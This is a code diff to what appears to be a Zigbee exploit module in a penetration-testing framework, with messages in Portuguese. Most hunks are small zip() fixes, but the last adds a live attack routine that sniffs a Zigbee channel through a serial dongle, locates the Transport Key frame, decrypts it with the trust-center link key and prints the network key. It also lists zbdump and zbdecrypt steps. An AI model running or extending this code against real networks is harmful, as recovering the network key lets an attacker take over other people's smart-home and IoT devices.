@@ -48,7 +48,7 @@ def _ccm_decrypt(key, nonce, ciphertext, auth_data=b"", mic_len=4):
         auth_block = la + auth_data
         auth_block += b"\x00" * (16 - (len(auth_block) % 16))
         for i in range(0, len(auth_block), 16):
-            block = bytes(a ^ b for a, b in zip(x, auth_block[i:i+16]))
+            block = bytes(a ^ b for a, b in zip(x, auth_block[i:i+16], strict=False))
             x = _aes_ecb_block(key, block)
     ct_body = ciphertext[:-mic_len]
     plaintext = bytearray()
@@ -57,7 +57,7 @@ def _ccm_decrypt(key, nonce, ciphertext, auth_data=b"", mic_len=4):
         a_i = struct.pack("B", 0x01) + nonce + struct.pack(">H", counter)
         s_i = _aes_ecb_block(key, a_i)
         chunk = ct_body[i:i+16]
-        plaintext.extend(bytes(c ^ s for c, s in zip(chunk, s_i[:len(chunk)])))
+        plaintext.extend(bytes(c ^ s for c, s in zip(chunk, s_i[:len(chunk)], strict=False)))
         counter += 1
     return bytes(plaintext)
 
@@ -149,7 +149,7 @@ class Exploit(Exploit):
             a_i = struct.pack("B", 0x01) + nonce + struct.pack(">H", counter)
             s_i = _aes_ecb_block(tc_key, a_i)
             chunk = transport_payload[i:i+16]
-            ciphertext.extend(bytes(p ^ s for p, s in zip(chunk, s_i[:len(chunk)])))
+            ciphertext.extend(bytes(p ^ s for p, s in zip(chunk, s_i[:len(chunk)], strict=False)))
             counter += 1
         mic = os.urandom(4)
         return {
@@ -229,3 +229,49 @@ class Exploit(Exploit):
         print_info("  3. zbdump -i {} -c {} -w join.pcap".format(
             self.interface or "CC2531", self.channel))
         print_info(f"  4. zbdecrypt -k {tc_key.hex()} join.pcap")
+
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: live sniff Zigbee traffic and extract network key."""
+        iface = str(self.interface).strip()
+        if not iface:
+            print_warning("Sem dongle configurado: skip captura ao vivo")
+            return
+
+        tc_key = self._parse_tc_link_key()
+        if not tc_key:
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        ch = int(self.channel)
+        ch_cmd = struct.pack("BB", 0x01, ch)
+        ser.write(ch_cmd)
+
+        print_status(f"Sniffing canal {ch} por 60s para capturar Transport Key...")
+        captured = b""
+        deadline = time.time() + 60
+        while time.time() < deadline:
+            chunk = ser.read(512)
+            if chunk:
+                captured += chunk
+
+        ser.close()
+
+        aps_cmd_offset = captured.find(bytes([0x05, 0x01]))
+        if aps_cmd_offset >= 0 and aps_cmd_offset + 20 <= len(captured):
+            encrypted_frame = captured[aps_cmd_offset:aps_cmd_offset + 32]
+            nonce = _build_ccm_nonce(b"\x00" * 8, 0, 0x05)
+            plaintext = _ccm_decrypt(tc_key, nonce, encrypted_frame)
+            if plaintext and len(plaintext) >= 18:
+                nwk_key = plaintext[2:18]
+                print_success(f"NETWORK KEY: {nwk_key.hex()}")
+                return
+
+        print_info(f"Capturados {len(captured)} bytes, nenhum Transport Key frame encontrado")
